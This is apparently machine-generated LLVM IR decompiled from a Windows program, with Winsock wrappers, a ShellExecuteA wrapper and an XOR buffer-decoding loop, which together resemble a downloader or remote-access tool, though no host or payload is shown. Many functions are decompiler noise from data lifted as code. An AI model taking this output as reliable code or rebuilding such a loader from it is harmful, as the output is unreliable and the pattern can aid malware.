declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ecx = alloca i32, align 4
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = bitcast i32* %ecx to i8*
  %22 = load i8, i8* %21, align 4, !insn.addr !239
  %23 = add i8 %22, %15, !insn.addr !239
  %24 = load i32, i32* %ecx, align 4, !insn.addr !239
  %25 = inttoptr i32 %24 to i8*, !insn.addr !239
  store i8 %23, i8* %25, align 1, !insn.addr !239
  %26 = load i8, i8* %5, align 4, !insn.addr !240
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !240
  %29 = add i8 %26, %28, !insn.addr !240
  %30 = inttoptr i32 %27 to i8*, !insn.addr !240
  store i8 %29, i8* %30, align 1, !insn.addr !240
  %31 = load i8, i8* %5, align 4, !insn.addr !241
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !241
  %34 = add i8 %31, %33, !insn.addr !241
  %35 = inttoptr i32 %32 to i8*, !insn.addr !241
  store i8 %34, i8* %35, align 1, !insn.addr !241
  %36 = load i8, i8* %5, align 4, !insn.addr !242
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !242
  %39 = add i8 %36, %38, !insn.addr !242
  %40 = inttoptr i32 %37 to i8*, !insn.addr !242
  store i8 %39, i8* %40, align 1, !insn.addr !242
  %41 = add i32 %0, -117, !insn.addr !243
  %42 = inttoptr i32 %41 to i8*, !insn.addr !243
  %43 = load i8, i8* %42, align 1, !insn.addr !243
  %44 = trunc i32 %2 to i8, !insn.addr !243
  %45 = add i8 %43, %44, !insn.addr !243
  store i8 %45, i8* %42, align 1, !insn.addr !243
  %46 = trunc i32 %2 to i16, !insn.addr !244
  %47 = call i8 @__asm_in(i16 %46), !insn.addr !244
  %48 = add i32 %20, -8, !insn.addr !245
  %49 = inttoptr i32 %48 to i32*, !insn.addr !245
  store i32 4212417, i32* %49, align 4, !insn.addr !245
  %50 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %51 = add i32 %20, -12, !insn.addr !246
  %52 = inttoptr i32 %51 to i32*, !insn.addr !246
  store i32 %50, i32* %52, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !247
  %53 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %54 = add i32 %53, 1, !insn.addr !248
  %55 = icmp eq i32 %54, 0, !insn.addr !248
  store i32 %54, i32* @global_var_409678, align 4, !insn.addr !248
  %56 = icmp eq i1 %55, false, !insn.addr !249
  br i1 %56, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %57 = call i32 @"@LStrClr"(), !insn.addr !250
  %58 = call i32 @"@LStrClr"(), !insn.addr !251
  %59 = call i32 @"@LStrClr"(), !insn.addr !252
  %60 = call i32 @"@LStrClr"(), !insn.addr !253
  %61 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %62 = add i32 %20, -4, !insn.addr !255
  %63 = inttoptr i32 %62 to i32*, !insn.addr !255
  %64 = load i32, i32* %52, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %64), !insn.addr !257
  store i32 4212424, i32* %63, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404810:
  %.reg2mem = alloca i32, !insn.addr !322
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_404891, label %dec_label_pc_40481b, !insn.addr !323

dec_label_pc_40481b:                              ; preds = %dec_label_pc_404810
  %5 = add i32 %1, 117, !insn.addr !322
  %6 = inttoptr i32 %5 to i32*, !insn.addr !322
  %7 = load i32, i32* %6, align 4, !insn.addr !322
  %8 = sext i32 %7 to i64, !insn.addr !322
  %9 = mul nsw i64 %8, 808467313, !insn.addr !322
  %10 = mul i64 %8, 3472340669219995648
  %11 = sdiv i64 %10, 4294967296, !insn.addr !322
  %12 = icmp ne i64 %9, %11, !insn.addr !322
  %13 = trunc i32 %2 to i16, !insn.addr !324
  %14 = call i32 @__asm_insd(i16 %13), !insn.addr !324
  %15 = inttoptr i32 %0 to i32*, !insn.addr !324
  store i32 %14, i32* %15, align 4, !insn.addr !324
  %16 = or i1 %4, %12, !insn.addr !325
  br i1 %16, label %dec_label_pc_404898, label %dec_label_pc_40481e, !insn.addr !325

dec_label_pc_40481e:                              ; preds = %dec_label_pc_40481b
  %17 = load i32, i32* %eax, align 4, !insn.addr !326
  %18 = add i32 %17, 49, !insn.addr !326
  %19 = inttoptr i32 %18 to i64*, !insn.addr !326
  %20 = load i64, i64* %19, align 4, !insn.addr !326
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !326
  %22 = load i32, i32* %eax, align 4, !insn.addr !327
  %23 = sub i32 1027158320, %22
  %24 = and i32 %23, %22, !insn.addr !327
  %25 = icmp slt i32 %24, 0, !insn.addr !327
  store i32 %22, i32* %.reg2mem, !insn.addr !328
  br i1 %25, label %dec_label_pc_40489a, label %dec_label_pc_40482c, !insn.addr !328

dec_label_pc_40482c:                              ; preds = %dec_label_pc_40481e
  %26 = add i32 %0, 98, !insn.addr !329
  %27 = inttoptr i32 %26 to i8*, !insn.addr !329
  %28 = load i8, i8* %27, align 1, !insn.addr !329
  %29 = udiv i32 %22, 256, !insn.addr !329
  %30 = trunc i32 %29 to i8, !insn.addr !329
  %31 = xor i8 %28, %30, !insn.addr !329
  %32 = icmp slt i8 %31, 0, !insn.addr !329
  store i8 %31, i8* %27, align 1, !insn.addr !329
  %33 = icmp eq i1 %32, false, !insn.addr !330
  br i1 %33, label %dec_label_pc_4048d0, label %dec_label_pc_404831, !insn.addr !330

dec_label_pc_404831:                              ; preds = %dec_label_pc_40482c
  %34 = inttoptr i32 %21 to i32*, !insn.addr !331
  %35 = load i32, i32* %34, align 4, !insn.addr !331
  call void @__asm_outsd(i16 %13, i32 %35), !insn.addr !331
  %36 = bitcast i32* %eax to i8*
  %37 = load i8, i8* %36, align 4, !insn.addr !332
  %38 = load i32, i32* %eax, align 4
  %39 = trunc i32 %38 to i8, !insn.addr !332
  %40 = add i8 %37, %39, !insn.addr !332
  %41 = inttoptr i32 %38 to i8*, !insn.addr !332
  store i8 %40, i8* %41, align 1, !insn.addr !332
  %42 = load i8, i8* %36, align 4, !insn.addr !333
  %43 = load i32, i32* %eax, align 4
  %44 = trunc i32 %43 to i8, !insn.addr !333
  %45 = add i8 %42, %44, !insn.addr !333
  %46 = inttoptr i32 %43 to i8*, !insn.addr !333
  store i8 %45, i8* %46, align 1, !insn.addr !333
  %47 = load i8, i8* %36, align 4, !insn.addr !334
  %48 = load i32, i32* %eax, align 4
  %49 = trunc i32 %48 to i8, !insn.addr !334
  %50 = add i8 %47, %49, !insn.addr !334
  %51 = inttoptr i32 %48 to i8*, !insn.addr !334
  store i8 %50, i8* %51, align 1, !insn.addr !334
  %52 = load i8, i8* %36, align 4, !insn.addr !335
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !335
  %55 = add i8 %52, %54, !insn.addr !335
  %56 = inttoptr i32 %53 to i8*, !insn.addr !335
  store i8 %55, i8* %56, align 1, !insn.addr !335
  %57 = load i8, i8* %36, align 4, !insn.addr !336
  %58 = load i32, i32* %eax, align 4
  %59 = trunc i32 %58 to i8, !insn.addr !336
  %60 = add i8 %57, %59, !insn.addr !336
  %61 = inttoptr i32 %58 to i8*, !insn.addr !336
  store i8 %60, i8* %61, align 1, !insn.addr !336
  %62 = load i8, i8* %36, align 4, !insn.addr !337
  %63 = load i32, i32* %eax, align 4
  %64 = trunc i32 %63 to i8, !insn.addr !337
  %65 = add i8 %62, %64, !insn.addr !337
  %66 = inttoptr i32 %63 to i8*, !insn.addr !337
  store i8 %65, i8* %66, align 1, !insn.addr !337
  %67 = load i8, i8* %36, align 4, !insn.addr !338
  %68 = load i32, i32* %eax, align 4
  %69 = trunc i32 %68 to i8, !insn.addr !338
  %70 = add i8 %67, %69, !insn.addr !338
  %71 = inttoptr i32 %68 to i8*, !insn.addr !338
  store i8 %70, i8* %71, align 1, !insn.addr !338
  %72 = load i8, i8* %36, align 4, !insn.addr !339
  %73 = load i32, i32* %eax, align 4
  %74 = trunc i32 %73 to i8, !insn.addr !339
  %75 = add i8 %72, %74, !insn.addr !339
  %76 = inttoptr i32 %73 to i8*, !insn.addr !339
  store i8 %75, i8* %76, align 1, !insn.addr !339
  %77 = load i8, i8* %36, align 4, !insn.addr !340
  %78 = load i32, i32* %eax, align 4
  %79 = trunc i32 %78 to i8, !insn.addr !340
  %80 = add i8 %77, %79, !insn.addr !340
  %81 = inttoptr i32 %78 to i8*, !insn.addr !340
  store i8 %80, i8* %81, align 1, !insn.addr !340
  %82 = load i8, i8* %36, align 4, !insn.addr !341
  %83 = load i32, i32* %eax, align 4
  %84 = trunc i32 %83 to i8, !insn.addr !341
  %85 = add i8 %82, %84, !insn.addr !341
  %86 = inttoptr i32 %83 to i8*, !insn.addr !341
  store i8 %85, i8* %86, align 1, !insn.addr !341
  %87 = load i8, i8* %36, align 4, !insn.addr !342
  %88 = load i32, i32* %eax, align 4
  %89 = trunc i32 %88 to i8, !insn.addr !342
  %90 = add i8 %87, %89, !insn.addr !342
  %91 = inttoptr i32 %88 to i8*, !insn.addr !342
  store i8 %90, i8* %91, align 1, !insn.addr !342
  %92 = load i8, i8* %36, align 4, !insn.addr !343
  %93 = load i32, i32* %eax, align 4
  %94 = trunc i32 %93 to i8, !insn.addr !343
  %95 = add i8 %92, %94, !insn.addr !343
  %96 = inttoptr i32 %93 to i8*, !insn.addr !343
  store i8 %95, i8* %96, align 1, !insn.addr !343
  %97 = load i8, i8* %36, align 4, !insn.addr !344
  %98 = load i32, i32* %eax, align 4
  %99 = trunc i32 %98 to i8, !insn.addr !344
  %100 = add i8 %97, %99, !insn.addr !344
  %101 = inttoptr i32 %98 to i8*, !insn.addr !344
  store i8 %100, i8* %101, align 1, !insn.addr !344
  %102 = load i8, i8* %36, align 4, !insn.addr !345
  %103 = load i32, i32* %eax, align 4
  %104 = trunc i32 %103 to i8, !insn.addr !345
  %105 = add i8 %102, %104, !insn.addr !345
  %106 = inttoptr i32 %103 to i8*, !insn.addr !345
  store i8 %105, i8* %106, align 1, !insn.addr !345
  %107 = add i32 %1, 110, !insn.addr !346
  %108 = inttoptr i32 %107 to i8*, !insn.addr !346
  %109 = load i8, i8* %108, align 1, !insn.addr !346
  %110 = udiv i32 %2, 256, !insn.addr !346
  %111 = trunc i32 %110 to i8, !insn.addr !346
  %112 = add i8 %109, %111, !insn.addr !346
  store i8 %112, i8* %108, align 1, !insn.addr !346
  %113 = load i32, i32* %eax, align 4, !insn.addr !346
  ret i32 %113, !insn.addr !346

dec_label_pc_404891:                              ; preds = %dec_label_pc_404810
  %114 = bitcast i32* %eax to i8*
  %115 = load i8, i8* %114, align 4, !insn.addr !347
  %116 = load i32, i32* %eax, align 4
  %117 = trunc i32 %116 to i8, !insn.addr !347
  %118 = add i8 %115, %117, !insn.addr !347
  %119 = inttoptr i32 %116 to i8*, !insn.addr !347
  store i8 %118, i8* %119, align 1, !insn.addr !347
  %120 = load i8, i8* %114, align 4, !insn.addr !348
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !348
  %123 = add i8 %120, %122, !insn.addr !348
  %124 = inttoptr i32 %121 to i8*, !insn.addr !348
  store i8 %123, i8* %124, align 1, !insn.addr !348
  %125 = load i8, i8* %114, align 4, !insn.addr !349
  %126 = load i32, i32* %eax, align 4
  %127 = trunc i32 %126 to i8, !insn.addr !349
  %128 = add i8 %125, %127, !insn.addr !349
  %129 = inttoptr i32 %126 to i8*, !insn.addr !349
  store i8 %128, i8* %129, align 1, !insn.addr !349
  %130 = load i32, i32* %eax, align 4, !insn.addr !349
  ret i32 %130, !insn.addr !349

dec_label_pc_404898:                              ; preds = %dec_label_pc_40481b
  %131 = icmp eq i1 %4, false, !insn.addr !350
  br i1 %131, label %dec_label_pc_404908, label %dec_label_pc_404898.dec_label_pc_40489a_crit_edge, !insn.addr !350

dec_label_pc_404898.dec_label_pc_40489a_crit_edge: ; preds = %dec_label_pc_404898
  %.pre = load i32, i32* %eax, align 4
  store i32 %.pre, i32* %.reg2mem
  br label %dec_label_pc_40489a

dec_label_pc_40489a:                              ; preds = %dec_label_pc_404898.dec_label_pc_40489a_crit_edge, %dec_label_pc_40481e
  %.reload = load i32, i32* %.reg2mem, !insn.addr !350
  ret i32 %.reload, !insn.addr !350

dec_label_pc_4048d0:                              ; preds = %dec_label_pc_40482c
  %132 = bitcast i32* %eax to i8*
  %133 = load i8, i8* %132, align 4, !insn.addr !351
  %134 = load i32, i32* %eax, align 4
  %135 = trunc i32 %134 to i8, !insn.addr !351
  %136 = add i8 %133, %135, !insn.addr !351
  %137 = inttoptr i32 %134 to i8*, !insn.addr !351
  store i8 %136, i8* %137, align 1, !insn.addr !351
  %138 = load i32, i32* %eax, align 4, !insn.addr !351
  ret i32 %138, !insn.addr !351

dec_label_pc_404908:                              ; preds = %dec_label_pc_404898
  %139 = bitcast i32* %eax to i8*
  %140 = load i8, i8* %139, align 4, !insn.addr !352
  %141 = load i32, i32* %eax, align 4
  %142 = trunc i32 %141 to i8, !insn.addr !352
  %143 = add i8 %140, %142, !insn.addr !352
  %144 = inttoptr i32 %141 to i8*, !insn.addr !352
  store i8 %143, i8* %144, align 1, !insn.addr !352
  %145 = load i8, i8* %139, align 4, !insn.addr !353
  %146 = load i32, i32* %eax, align 4
  %147 = trunc i32 %146 to i8, !insn.addr !353
  %148 = add i8 %145, %147, !insn.addr !353
  %149 = inttoptr i32 %146 to i8*, !insn.addr !353
  store i8 %148, i8* %149, align 1, !insn.addr !353
  %150 = load i8, i8* %139, align 4, !insn.addr !354
  %151 = load i32, i32* %eax, align 4
  %152 = trunc i32 %151 to i8, !insn.addr !354
  %153 = add i8 %150, %152, !insn.addr !354
  %154 = inttoptr i32 %151 to i8*, !insn.addr !354
  store i8 %153, i8* %154, align 1, !insn.addr !354
  %155 = load i32, i32* %eax, align 4, !insn.addr !354
  ret i32 %155, !insn.addr !354
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !355
  ret i32 %0, !insn.addr !355
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !356
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !357
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !358
  %2 = add i32 %1, -1, !insn.addr !358
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !358
  ret i32 %0, !insn.addr !359
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !360
  ret i32* %0, !insn.addr !360
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !361
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !361
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !361
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !362
